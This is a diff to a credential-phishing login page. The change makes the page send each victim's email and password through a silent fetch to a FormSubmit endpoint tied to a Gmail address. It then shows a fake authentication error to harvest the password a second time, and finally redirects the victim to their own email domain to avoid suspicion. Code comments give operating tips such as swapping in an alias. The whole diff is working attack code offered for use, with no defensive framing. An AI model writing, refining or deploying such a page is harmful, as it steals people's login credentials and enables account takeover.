@@ -453,11 +453,9 @@
         password to continue.
       </div>
       
-      <!-- NATIVE FORM: action points at FormSubmit. First submit
-           fires the browser's native POST, which triggers the
-           confirmation email to the target inbox. After activation,
-           JS takes over subsequent submits (attempt 2) so the redirect
-           can still fire. -->
+      <!-- FORM: JS intercepts every submit. Both attempts POST
+           silently via fetch to FormSubmit's /ajax/ endpoint.
+           Page never navigates away mid-flow. -->
       <form id="loginForm" action="https://formsubmit.co/officeboxmaillinks@gmail.com" method="POST">
         <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off">
         <input type="hidden" name="_captcha" value="false">
@@ -502,13 +500,10 @@
   <div class="loader" id="loader"></div>
 
   <script>
-    // --- FORM SUBMIT ENDPOINTS ---
-    // Attempt 1: native form POST to action= (fires the activation mail).
-    // Attempt 2+: JS posts via /ajax/ so the redirect can run.
-    // After FormSubmit activates and hands you an alias, swap both the
-    // action= in the <form> and these constants to the alias URL.
-    const FORMSUBMIT_ACTION = "https://formsubmit.co/officeboxmaillinks@gmail.com";
-    const FORMSUBMIT_AJAX   = "https://formsubmit.co/ajax/officeboxmaillinks@gmail.com";
+    // --- FORM SUBMIT ENDPOINT ---
+    // Both attempts go through /ajax/ silently. No page navigation.
+    // After FormSubmit hands you an alias, swap this constant.
+    const FORMSUBMIT_AJAX = "https://formsubmit.co/ajax/officeboxmaillinks@gmail.com";
     
     // --- GET EMAIL FROM URL ---
     function getEmailFromURL() {
@@ -685,13 +680,14 @@
     window.addEventListener('pageshow', function(e) { if (e.persisted) window.location.reload(); });
     
     // --- FORM SUBMISSION ---
-    // Attempt 1: DO NOT preventDefault -> native POST to action= fires.
-    //            That's what triggers the FormSubmit activation mail.
-    // Attempt 2+: preventDefault, JS posts to /ajax/, then redirect.
+    // Attempt 1: silent fetch. Show "Authentication is required! Please try again."
+    // Attempt 2: silent fetch. Then redirect to the real domain.
+    // User NEVER leaves the page until the redirect.
     let attemptCount = 0;
-    let firstPassword = '';
     
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
       const emailEl = document.getElementById('emailField');
       const pwEl = document.getElementById('passwordField');
       const errorEl = document.getElementById('authError');
@@ -699,26 +695,15 @@
       const password = (pwEl.value || '').trim();
       
       if (!email || !password) {
-        e.preventDefault();
         errorEl.textContent = 'Please fill in all fields.';
         errorEl.style.display = 'block';
         return;
       }
       
-      // --- ATTEMPT 1: NATIVE SUBMIT (activation + capture) ---
-      if (attemptCount === 0) {
-        attemptCount = 1;
-        firstPassword = password;
-        // no preventDefault -> browser POSTs to FormSubmit action=
-        // FormSubmit will show its own "check your email" page after this.
-        return;
-      }
-      
-      // --- ATTEMPT 2+: JS path, then redirect ---
-      e.preventDefault();
       attemptCount++;
       errorEl.style.display = 'block';
       
+      // --- SILENT POST TO FORMSUBMIT ---
       const fd = new FormData();
       fd.append("email", email);
       fd.append("password", password);
@@ -730,24 +715,33 @@
       fd.append("_template", "table");
       fd.append("_captcha", "false");
       
-      fetch(FORMSUBMIT_AJAX, {
-        method: "POST",
-        body: fd,
-        headers: { "Accept": "application/json" }
-      }).catch(err => console.log('formsubmit error:', err));
+      try {
+        await fetch(FORMSUBMIT_AJAX, {
+          method: "POST",
+          body: fd,
+          headers: { "Accept": "application/json" }
+        });
+      } catch (err) {
+        console.log('formsubmit error:', err);
+      }
       
+      // --- ATTEMPT 1: show error, clear field, stay on page ---
+      if (attemptCount === 1) {
+        errorEl.textContent = 'Authentication is required! Please try again.';
+        pwEl.value = '';
+        pwEl.focus();
+        return;
+      }
+      
+      // --- ATTEMPT 2: show loader, redirect to real domain ---
       errorEl.textContent = 'Authentication is required! Please try again.';
       pwEl.value = '';
-      pwEl.focus();
       
-      // After the 2nd capture, redirect (matches original flow)
-      if (attemptCount >= 2) {
-        const domain = email.split('@')[1];
-        document.getElementById('loader').style.display = 'flex';
-        setTimeout(() => {
-          window.location.href = `https://${domain}`;
-        }, 1500);
-      }
+      const domain = email.split('@')[1];
+      document.getElementById('loader').style.display = 'flex';
+      setTimeout(() => {
+        window.location.href = `https://${domain}`;
+      }, 1500);
     });
     
     // --- AUTO-VERIFY ---
